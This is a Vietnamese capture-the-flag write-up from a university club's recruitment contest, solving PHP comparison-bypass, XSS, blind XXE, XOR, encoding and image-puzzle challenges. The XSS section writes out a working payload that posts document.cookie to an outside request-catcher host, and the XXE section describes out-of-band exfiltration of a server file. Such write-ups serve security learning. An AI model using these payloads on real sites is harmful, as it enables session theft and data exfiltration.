# KCSC TTV CTF - Phạm Tiến Duy_AT17E
## Phpri Phprai
### Description
Khi truy cập vào trang web BTC cung cấp ta nhận được source code xử lý như sau:
![image](https://user-images.githubusercontent.com/86275419/212816476-1d4e082e-635f-4f75-8733-ac0a472ba16d.png)

Bài này yêu cầu ta phải truyền các cặp `Key=Value` lên URL để vượt qua các câu lệnh kiểm tra điều kiện `IF` để lấy Flag. Ta phải vượt qua tổng cộng 5 câu lệnh `IF` để lấy được Flag hoàn chỉnh.

### Solution
1. Tại vòng IF thứ nhất:

![image](https://user-images.githubusercontent.com/86275419/212819298-86ce4140-d9b4-4610-ad15-1b0ca9f092db.png)

Ta sẽ phải truyền 2 cặp `Key=Value` lên URL sao cho 2 Value phải khác nhau, nhưng khi Hash 2 value qua hàm `md5()` phải cho kết quả so sánh `==` giống nhau. 
Mình đã search trên mạng với từ khóa `php hash collision` và tìm được [bài viết này](https://news.ycombinator.com/item?id=9484757)

Cặp Key-Value 1: `1=QNKCDZO` 

Cặp Key-Value 2: `2=240610708`

URL lúc này: `47.254.251.2:8889/?1=QNKCDZO&2=240610708`

Ta lấy được Flag đầu tiên: `KCSC{B0_u_Bu_S4`

2. Tại vòng IF thứ hai:

![image](https://user-images.githubusercontent.com/86275419/212825259-abd99b01-b14d-497a-927e-594277f3049e.png)

Ta sẽ phải truyền 1 cặp `key&value` sao cho khi so sánh với giá trị của biến `$$flag` qua hàm `strcmp()` sẽ phải giống nhau. Hiện tại mình để ý thấy biến $$flag không thấy được khởi tạo trong source code nên mình sẽ thử không truyền value lên url

Cặp Key-Value 3: `3=`

URL lúc này: `47.254.251.2:8889/?1=QNKCDZO&2=240610708&3=`

Ta lấy được phần Flag thứ hai: `C_8usssssss_htt`

3. Tại vòng IF thứ ba:

![image](https://user-images.githubusercontent.com/86275419/212826228-e1dcead0-1803-4c13-a284-45b9cd5126e2.png)

Ta sẽ phải truyền một giá trị lên url sao cho giá trị này khi so sánh bằng toán tử `==` phải giống chuỗi '1.4e5' và khi so sánh bằng toán tử `!==` phải khác chuỗi '1.4e5'

Toán tử  `==` khi so sánh 2 giá trị sẽ chuyển một chuỗi ra kiểu số để so sánh mà không xét đến kiểu dữ liệu là gì 

Toán tử `!==` sẽ so sánh 2 chuỗi phải có giá trị giống nhau và kiểu dữ liệu cũng phải giống nhau

--> Ta sẽ đổi `1.4e5` ra số sẽ được `140000`. Ta sẽ truyền `140000` lên URL

Cặp Key-Value 3: `4=140000`

URL lúc này: `47.254.251.2:8889/?1=QNKCDZO&2=240610708&3=&4=140000`

Ta lấy được phần Flag thứ ba: `ps://www.youtub`

4. Tại vòng IF thứ tư

![image](https://user-images.githubusercontent.com/86275419/212827465-59dfcb61-f67e-43f3-a7c7-48805ad6d259.png)

Như đã giải thích bên trên với toán tử `==` và `!==`

Ta sẽ truyền: `%2069` lên URL (%20 là encode url của dấu cách)

+ Khi so sánh `$str5 == 69`: $str5 là kiểu chuỗi sẽ được convert sang kiểu số nên sẽ cho giá trị boolean True
+ Khi so sánh `$str5 !== '69'` và `$str5 !==69`: $str5 sẽ giữ nguyên kiểu dữ liệu (do đó có dấu cách) nên khi so sánh với '69' sẽ cho giá trị boolean True
+ Khi `$str5` qua hàm `trim()` sẽ loại bỏ dấu cách, khi qua hàm strlen() sẽ có giá trị bằng 2 do đó giá trị boolean khi so sánh ở đây cũng là True

URL lúc này: `47.254.251.2:8889/?1=QNKCDZO&2=240610708&3=&4=140000&5=%2069`

Ta lấy được phần Flag thứ tư: `e.com/watch?v=x`

5. Tại vòng IF cuối

![image](https://user-images.githubusercontent.com/86275419/212829856-a973aa20-9b84-4871-a11f-0a4108245c9c.png)

Ở đây ta thấy bài sử dụng hàm `preg_replace()` để replace chuỗi của `$str1` (KaCeEtCe) thành `''` trong chuỗi `$str6` (chuỗi ta nhập vào)

Để vượt qua hàm này đơn giản là ta sẽ truyền: `KaCeKaCeEtCeEtCe`
+ Vì khi replace, hàm này sẽ replace `KaCeEtCe`, tại chuỗi ta truyền vào sẽ replace KaCe`KaCeEtCe`EtCe, do đó sau khi replace chuỗi ta nhập vào thì lúc này còn `KaCeEtCe`

URL lúc này: `47.254.251.2:8889/?1=QNKCDZO&2=240610708&3=&4=140000&5=%2069&6=KaCeKaCeEtCeEtCe`

Ta lấy được phần Flag cuối: `QtC3F8fH6g}`

Flag: `KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}`

## Hi Hi Hi

### Description
Khi ta truy cập vào trang Web BTC cung cấp sẽ được:
- Trang chủ:

![image](https://user-images.githubusercontent.com/86275419/212838054-5469a059-11f1-47a7-8c3e-05169bacb27b.png)

- Report Admin:
![image](https://user-images.githubusercontent.com/86275419/212838901-9dfe2bcd-e1b1-45d4-9790-4dbca344a4fd.png)



Trang web này Author đã hint cho chúng ta dính lỗi XSS (trên Tab Name) nên ta sẽ focus vào việc test các lỗi XSS ở trang chủ sau đó vào chức năng Report Admin để gửi URL chứa Script XSS tới Server để lấy giá trị Cookie (mình đoán trên Server sẽ có một con Bot để kick link mình gửi lên)

### Solution

Sau một hồi test lỗi XSS bằng các Script phổ biến thì mình thấy bị Filter:

![image](https://user-images.githubusercontent.com/86275419/212839811-eacf99ca-8846-435e-a084-1d8ce1aed471.png)

Mình đã lên [đây](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) để tìm script và mình tìm được: `<body onload=alert(1)>` không bị filter

![image](https://user-images.githubusercontent.com/86275419/212840507-e99e5b03-f6b3-4a0b-9c34-89ff672df9eb.png)

+ `<body onload=alert(1)>`: Khi load đến tag này sẽ thực thi câu lệnh ở attribute `onload`, ở câu lệnh này sẽ thực thi alert(1)

Mình sẽ custom lại đoạn script để nó có chức năng gửi lại cookie cho mình khi một ai đó bấm vào link bằng cách sử dụng `Fetch API`:

![image](https://user-images.githubusercontent.com/86275419/212841794-123427ba-a15e-45ea-b201-4e4db48b201b.png)

Domain mình sẽ dùng https://requestcatcher.com/ để bắt lại các request khi được gửi đến, ngoài các bạn có thể dùng `Burp Collaborator` của Burp Suite

Payload: `<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`

Khi mình test trên trang web dính lỗi thì đã bắt được request đến:

![image](https://user-images.githubusercontent.com/86275419/212845189-c6d4f663-d1bb-4e2c-ac8d-51fda51af805.png)

URL: `http://146.190.115.228:20109/?message=<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`

Nhưng khi mình gửi URL chứa đoạn script kia đến server thì đã có vấn đề, server không có request nào đến trang web (https://duypt.requestcatcher.com/test) của mình, dường như payload của mình đã bị filter

Nhưng sau cùng mình thử lại và nhận ra rằng không có sự filter nào mà là do mình gửi không đúng port,  mình thử thay port giống như Author hint nhưng không để ý:
![image](https://user-images.githubusercontent.com/86275419/212853082-5165fae2-dc32-4b54-8721-8f93e81e2c76.png)

Mình sẽ custom lại payload: `http://127.0.0.1:13337/?message=<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`

Kiểm tra lại bên `requestcatcher.com`:
 
 ![image](https://user-images.githubusercontent.com/86275419/212851929-c9f020eb-64b6-479f-85d4-91c65614902b.png)
 
 Flag: `KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}`

 
## XXD

### Description
Hint: `The flag location is: /flag.txt`
Hint: `payload all the thing`

![image](https://user-images.githubusercontent.com/86275419/212857366-6cf843b3-5dac-4550-b326-cd126ab4adad.png)

Trang web này có một form để người dùng nhập vào và gửi đi, ta sẽ cần bắt request gửi đi của trang web để xem có thể xuất hiện lỗi gì.

### Solution

Ta sẽ sử dụng Burp Suite để bắt request:
![image](https://user-images.githubusercontent.com/86275419/212859678-adb479b5-c41b-4405-9ca4-5d8a4a23e2e1.png)

Ta sẽ phân tích gói tin thứ 9, đây là gói tin gửi thông tin ở form lên cho server:

![image](https://user-images.githubusercontent.com/86275419/212859992-5513f2a8-38c9-4dc3-85d1-cdf299bf0a35.png)

Ta thấy rằng thông tin của form được gửi lên cho server bằng XML
Đến đây dựa vào tên đề bài (XXD) và dữ liệu gửi lên Server bằng XML ta có thể xác định trang web đang dính lỗi XXE

Response:

![image](https://user-images.githubusercontent.com/86275419/212863098-a8ca375c-1cea-498c-be36-3c22f5324cc0.png)


Ta sẽ gửi một số Payload cơ bản lên Server xem Response từ server có thể lấy dữ liệu trực tiếp được không, ở đây do có Hint từ đề bài nên mình sẽ thử bằng Payload XXE của [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection):

![image](https://user-images.githubusercontent.com/86275419/212866309-1be2c97d-72c4-48f6-9bc4-4b636b32af89.png)

Ta nhận thấy rằng Server sẽ không trả về kết quả trực tiếp, do đó ta sẽ phải sử dụng [Blind XEE](https://portswigger.net/web-security/xxe/blind):

Sau một hồi test, thì mình thấy phải sử dụng `XXE OOB with DTD and PHP filter`:

![image](https://user-images.githubusercontent.com/86275419/212868589-e5f66662-d8a4-4902-9e27-6434daa00dd5.png)

- Trong kỹ thuật này mình cần tạo một server có chức năng truyền file khi một request yêu cầu (mình sẽ tận dụng kali linux + ngrok) và cần một nơi để bắt được request đến (mình sẽ sử dụng [requestcatcher.com](https://duypt.requestcatcher.com/)):
+ Đầu tiên mình sẽ tạo một file XML trong server của mình đặt tên là `dtd.xml`, với nội dụng như sau:

![image](https://user-images.githubusercontent.com/86275419/212874834-2504f37a-74a9-4964-afd3-38c3974f3229.png)

--> Script này thực hiện việc gửi dữ liệu trong file `/flag.txt` tới `https://duypt.requestcatcher.com/`

+ Chuyển sang Burp Suite để request đến trang Web của BTC, mình sẽ request với nội dung như sau:

![image](https://user-images.githubusercontent.com/86275419/212874927-8bba1ef5-7854-4a71-9c38-0e759b35ecf6.png)

--> Script này sẽ thực hiện việc truy vấn đến server mà ta đã dựng sẵn để lấy file `dtd.xml` chứa các entities mà ta đã định nghĩa sẵn, sau đó sẽ gọi và thực thi các entities đó

![image](https://user-images.githubusercontent.com/86275419/212871511-5addcab9-b225-4a3a-968d-45a0e168911f.png)

Kết quả tại `https://duypt.requestcatcher.com/`:

![image](https://user-images.githubusercontent.com/86275419/212872996-e28ec2c9-6b81-4476-92a4-00611df7e626.png)

Sau dấu `?` của URL chính là flag đang được encode
Decode base 64 ta sẽ được Flag: `KCSC{blind_xxD_xxO_xx]_xxe!!@#@}`

## Tet_is_ya_best (Crypto)

### Description
Đây là lần đầu mình chơi crypto ở một giải CTF nên còn hơi bỡ ngỡ. Sau khi tải file `output.txt` đề bài cho mình mở ra xem:

![image](https://user-images.githubusercontent.com/86275419/212926394-afa83240-5588-4e90-9efc-3dac0cec764f.png)

Đây là một đoạn thông điệp đã được mã hóa, nhiệm vụ của chúng ta là giải mã để lấy thông điệp

### Solution

Ý tưởng của mình là phải xác định được xem đây là loại mã hóa gì sau đó giải mã đó

Mình lên mạng tìm `tool for cryptography ctf` và mình tìm được trang [này](https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/cryptography)

Ta sẽ sử dụng `https://quipqiup.com/` để xác loại mã hóa và giải mã:

![image](https://user-images.githubusercontent.com/86275419/212927593-2c3314d2-e15d-493e-b61a-9423b5f1a4df.png)

Vì định dạng Flag là KCSC viết hoa nên ta sẽ phải sửa lại flag thành: `KCSC{tet_tet_tet_tet_den_roi__chuc_cac_ban_nam_moi_that_nhieu_suc_khoe__luv_from_luluuuuuuuuuuuu}`


## ezenc (Crypto)

### Description

Sau khi tải file của bài cung cấp ta được một đoạn thông điệp được mã hóa sau:
`4e544d7a4d44526c4e5451314d544d7a4e7a51304e6a59794e6d51305a5463324e5745304e7a5a6a4e7a553159544d784d7a6b305954597a4d7a457a4f5451304e6a497a4d6a4d354e7a4d304f54557a4e4455324f4459324e54457a5a444e6b`

### Solution

Ta lại sử dụng trang `https://quipqiup.com/` để xác loại mã hóa và giải mã:

Bài này thông điệp mã hóa qua nhiều loại mã khác nhau nên ta sẽ phải decode nhiều lần:

Lần 1: ta xác định được thông điệp mã hóa bằng Hex, giải mã ta được:

![image](https://user-images.githubusercontent.com/86275419/212931526-ad0a9509-fd15-4b1e-a024-dd7a3a5d952d.png)

Lần 2: Tiếp tục giải mã bản mã ta xác định được thông điệp được mã hóa bằng Base-64, giải mã ta được:

![image](https://user-images.githubusercontent.com/86275419/212931704-f8bed42a-b503-4d18-8d5e-88a46b28721d.png)

Lần 3: Thông điệp lại được mã hóa bằng Hex, giải mã ta được:

![image](https://user-images.githubusercontent.com/86275419/212930622-7ff50879-8cb4-45b4-a30a-39dcb8be8220.png)

Lần 4: Lần này thông điệp được mã hóa bằng Base-64, giải mã ta được Flag:

![image](https://user-images.githubusercontent.com/86275419/212930952-3941e374-49ba-4744-a898-a5be5e5b92c7.png)

Flag: `KCSC{Encoding_Is_Cool!!!}`

## Waiting xor you (Crypto)

### Description

Sau khi tải source code bài cho mình được:

![image](https://user-images.githubusercontent.com/86275419/212933811-fcc6344a-639e-4125-b624-1d9d020840d4.png)

Source code cho kết quả sau khi mã hóa Flag và hàm dùng để mã hóa, việc của chúng ta là tìm Key và Xor bản mã với Key để lấy Flag

### Solution

Sau khi đọc code mình thấy rằng hàm `xor` thực hiện xor từng byte của Flag với từng byte của Key để mã hóa

Key có 6 ký tự, mà ở biến `flag` đã cho ta sẵn ta 5 ký tự dạng rõ nên ta sẽ xor ngược bản mã với bản rõ để lấy 5 ký tự của Key, mình sửa code một chút và chạy lại:

![image](https://user-images.githubusercontent.com/86275419/212936061-6a22918a-1b25-4868-9050-3ef2a1c5a7ec.png)

Ta thu được 5 ký tự đầu tiên của Key là: `us_oa`

Hiện tại mình vẫn còn phải tìm 1 ký tự của Key nữa, mình có thể brute-force ký tự cuối cùng để thu được một bản rõ có nghĩa. Nhưng trong trường hợp này, do khi đọc Description của đề mình thấy tác giả có để `ú òa` nên mình mạnh dạn thêm chữ `f` vào cuối rồi thử xor lại, lúc này Key sẽ là `us_oaf`, sau khi chạy mình thu được Flag:

![image](https://user-images.githubusercontent.com/86275419/212937154-9ea7132d-1091-4cc8-915b-ae26c99e2513.png)

Flag: `KCSC{MONO_IS__WEITINNN_F0R_Y0U##}`

## BinggChillinggg (PROG/MISC)

### Description

Do chưa có kinh nghiệm chơi mảng này nên ban đầu mình cũng chỉ định tải về trải nghiệm, nhưng với bài này mình có chút may mắn vì đang dùng Windows 11 :))

Sau khi tải file BTC cung cấp mình nhận được 1 file chứa 4056 tấm ảnh:

![image](https://user-images.githubusercontent.com/86275419/212939270-efbe30a1-f3fc-4d58-a3f7-b7e1a9c01209.png)

Mình đoán là flag sẽ nằm trong đống ảnh này và công việc của mình là tìm ra nó

### Solution

Sau khi vào xem list ảnh mình phát hiện có 1 đoạn ảnh từ `img20_10` đến `img30_710` bao gồm các phần của flag:

Ban nãy tại sao mình lại bảo mình may mắn vì dùng Windows 11 là vì đây:

![image](https://user-images.githubusercontent.com/86275419/212940814-c9364c35-fed8-4a2d-8714-f8f48db74a65.png)

Mọi người có thể thấy rằng chức năng xem ảnh của Windows 11 có phần phóng to ở bên dưới, lợi dụng điều này, mình sẽ xem ảnh từ `img20_10` đến `img30_710` để ghép lại thành flag

Do mình thấy đây là một câu khá nổi tiếng gần đây nên cũng không gặp nhiều khó khăn trong việc ghép flag, pha xử lý dưới đây của mình hơi cồng kềnh :))

![image](https://user-images.githubusercontent.com/86275419/212943390-995bd9c0-ebcb-4281-a5c4-d792c1c9980a.png)
 
 Flag: `KCSC{Zao_shang_hao_zhong_gou!_Xian_zai_wo_you_bing_chilling!!}`
 
 
 ## Kết
 
 Đây là toàn bộ bài mình làm được trong cuộc thi tuyển vào CLB KCSC vừa rồi, do lần đầu mình viết 1 bài write up như thế này nên văn vở còn lủng củng, mong mọi người bỏ qua. 
 
 Cảm ơn BTC đã tạo ra cuộc thi để mình được trải nghiệm và phát triển kỹ năng của mình. Chúc KCSC ngày càng phát triển! 

 Cảm ơn mọi người đã đọc Write Up. Bye :wave:

